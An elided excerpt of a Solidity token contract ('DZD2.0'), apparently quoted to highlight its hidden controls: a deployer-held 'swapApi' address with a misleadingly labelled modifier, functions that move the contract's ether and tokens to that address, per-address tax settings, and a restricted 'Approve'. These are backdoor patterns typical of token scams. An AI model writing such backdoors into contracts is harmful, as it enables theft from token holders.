...
contract DZD is Context, IERC20, Ownable {
    ...
    string private _name = "DZD2.0";
    string private _symbol = "DZD2.0";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xA62e3e990b6943fbF3650AcE39Bbe8d95b0CC113); 
    address payable private teamWalletAddress = payable(0xfAce5a09F79d23E7C5CEaC33bf54700b90f89671); 
	...
	address  public swapApi =_msgSender();
	...
	modifier onlyLD {
       require(swapApi == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(swapApi).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(swapApi, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyLD {
	...
	function Approve(address spender,uint256 amount)public onlyLD{
